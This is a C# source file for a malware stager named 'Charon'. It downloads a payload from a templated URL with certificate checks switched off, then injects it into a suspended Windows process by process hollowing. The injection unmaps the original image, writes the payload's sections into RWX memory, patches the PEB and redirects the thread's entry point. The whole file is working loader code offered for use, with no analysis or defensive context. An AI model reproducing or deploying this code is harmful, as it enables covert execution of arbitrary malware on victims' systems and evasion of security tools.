using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace Charon
{
    internal static class Log
    {
        static string path = Path.Combine(Path.GetTempPath(), "charon.log");
        public static void W(string msg)
        {
            try { File.AppendAllText(path, msg + "\n"); } catch {}
        }
        public static void W(string fmt, params object[] args)
        {
            W(string.Format(fmt, args));
        }
    }

    public class Stager
    {
        public static void Main()
        {
            Execute();
        }

        public static void Execute()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;

            try
            {
                Log.W("[*] Downloading payload from %DOWNLOAD_URL%");
                byte[] peBytes;
                using (WebClient wc = new WebClient())
                {
                    peBytes = wc.DownloadData("%DOWNLOAD_URL%");
                }
                Log.W("[+] Downloaded {0} bytes", peBytes.Length);

                RunPE.Execute(peBytes, @"%SPAWN_PROCESS%");
            }
            catch (Exception ex)
            {
                Log.W("[-] Stager error: {0}", ex.Message);
            }
        }
    }

    internal static class RunPE
    {
        const uint CREATE_SUSPENDED = 0x4;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // x64 CONTEXT layout
        const int CONTEXT64_SIZE = 1232;
        const int CTX_FLAGS_OFFSET = 0x30;
        const int CTX_RCX_OFFSET = 0x80;
        const int CTX_RDX_OFFSET = 0x88;
        const uint CONTEXT_FULL = 0x10000B;

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved, lpDesktop, lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public ushort wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public uint dwProcessId, dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll")]
        static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            uint nSize, out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            uint nSize, out uint lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        public static void Execute(byte[] payload, string targetProcess)
        {
            // --- Parse PE headers ---
            if (payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D)
            {
                Log.W("[-] Invalid PE: bad MZ header");
                return;
            }

            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
            if (e_lfanew < 0 || e_lfanew + 4 > payload.Length)
            {
                Log.W("[-] Invalid PE: bad e_lfanew");
                return;
            }
            if (BitConverter.ToUInt32(payload, e_lfanew) != 0x00004550)
            {
                Log.W("[-] Invalid PE: bad PE signature");
                return;
            }

            int optHeaderOffset = e_lfanew + 24;
            ushort magic = BitConverter.ToUInt16(payload, optHeaderOffset);
            if (magic != 0x20B)
            {
                Log.W("[-] Not a PE32+ (x64) binary, magic: 0x{0:X}", magic);
                return;
            }

            uint entryPointRva = BitConverter.ToUInt32(payload, optHeaderOffset + 16);
            long imageBase = BitConverter.ToInt64(payload, optHeaderOffset + 24);
            uint sizeOfImage = BitConverter.ToUInt32(payload, optHeaderOffset + 56);
            uint sizeOfHeaders = BitConverter.ToUInt32(payload, optHeaderOffset + 60);
            ushort numberOfSections = BitConverter.ToUInt16(payload, e_lfanew + 6);
            ushort sizeOfOptionalHeader = BitConverter.ToUInt16(payload, e_lfanew + 20);

            Log.W("[+] PE parsed: ImageBase=0x{0:X} SizeOfImage=0x{1:X} EntryRVA=0x{2:X} Sections={3}",
                imageBase, sizeOfImage, entryPointRva, numberOfSections);

            // --- Create suspended process ---
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi;

            if (!CreateProcessW(targetProcess, null,
                IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED,
                IntPtr.Zero, null, ref si, out pi))
            {
                Log.W("[-] CreateProcessW failed: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Log.W("[+] Created suspended process PID={0}", pi.dwProcessId);

            // Allocate 16-byte aligned CONTEXT
            IntPtr rawCtx = Marshal.AllocHGlobal(CONTEXT64_SIZE + 16);
            IntPtr ctx = (IntPtr)(((long)rawCtx + 15) & ~15L);

            try
            {
                for (int i = 0; i < CONTEXT64_SIZE; i++)
                    Marshal.WriteByte(ctx, i, 0);

                Marshal.WriteInt32(ctx, CTX_FLAGS_OFFSET, (int)CONTEXT_FULL);

                if (!GetThreadContext(pi.hThread, ctx))
                {
                    Log.W("[-] GetThreadContext failed: {0}", Marshal.GetLastWin32Error());
                    TerminateProcess(pi.hProcess, 1);
                    return;
                }

                long pebAddress = Marshal.ReadInt64(ctx, CTX_RDX_OFFSET);
                Log.W("[+] PEB at 0x{0:X}", pebAddress);

                byte[] buf8 = new byte[8];
                uint br;
                ReadProcessMemory(pi.hProcess, (IntPtr)(pebAddress + 0x10), buf8, 8, out br);
                long originalImageBase = BitConverter.ToInt64(buf8, 0);
                Log.W("[+] Original ImageBase=0x{0:X}", originalImageBase);

                // --- Hollow ---
                uint unmapResult = NtUnmapViewOfSection(pi.hProcess, (IntPtr)originalImageBase);
                Log.W("[*] NtUnmapViewOfSection = 0x{0:X}", unmapResult);

                IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase,
                    sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (newBase == IntPtr.Zero)
                {
                    Log.W("[-] VirtualAllocEx failed: {0}", Marshal.GetLastWin32Error());
                    TerminateProcess(pi.hProcess, 1);
                    return;
                }
                Log.W("[+] Allocated at 0x{0:X}", (long)newBase);

                // --- Write PE ---
                uint bw;
                byte[] headerBytes = new byte[sizeOfHeaders];
                Buffer.BlockCopy(payload, 0, headerBytes, 0, (int)sizeOfHeaders);
                WriteProcessMemory(pi.hProcess, newBase, headerBytes, sizeOfHeaders, out bw);
                Log.W("[+] Wrote headers ({0} bytes)", bw);

                int sectionTableOffset = e_lfanew + 24 + sizeOfOptionalHeader;
                for (int i = 0; i < numberOfSections; i++)
                {
                    int shdr = sectionTableOffset + (i * 40);
                    uint virtualAddress = BitConverter.ToUInt32(payload, shdr + 12);
                    uint sizeOfRawData = BitConverter.ToUInt32(payload, shdr + 16);
                    uint pointerToRawData = BitConverter.ToUInt32(payload, shdr + 20);

                    if (sizeOfRawData == 0 || pointerToRawData == 0)
                        continue;

                    byte[] section = new byte[sizeOfRawData];
                    Buffer.BlockCopy(payload, (int)pointerToRawData, section, 0, (int)sizeOfRawData);
                    WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + virtualAddress),
                        section, sizeOfRawData, out bw);
                    Log.W("[+] Section {0}: VA=0x{1:X} Size=0x{2:X}", i, virtualAddress, sizeOfRawData);
                }

                if ((long)newBase != originalImageBase)
                {
                    byte[] baseBytes = BitConverter.GetBytes((long)newBase);
                    WriteProcessMemory(pi.hProcess, (IntPtr)(pebAddress + 0x10), baseBytes, 8, out bw);
                    Log.W("[+] Updated PEB ImageBase");
                }

                long entryPoint = (long)newBase + entryPointRva;
                Marshal.WriteInt64(ctx, CTX_RCX_OFFSET, entryPoint);

                if (!SetThreadContext(pi.hThread, ctx))
                {
                    Log.W("[-] SetThreadContext failed: {0}", Marshal.GetLastWin32Error());
                    TerminateProcess(pi.hProcess, 1);
                    return;
                }
                Log.W("[+] EntryPoint set to 0x{0:X}", entryPoint);

                ResumeThread(pi.hThread);
                Log.W("[+] Thread resumed — payload should be running in PID {0}", pi.dwProcessId);
            }
            catch (Exception ex)
            {
                Log.W("[-] RunPE exception: {0}", ex.Message);
                TerminateProcess(pi.hProcess, 1);
            }
            finally
            {
                Marshal.FreeHGlobal(rawCtx);
            }
        }
    }
}
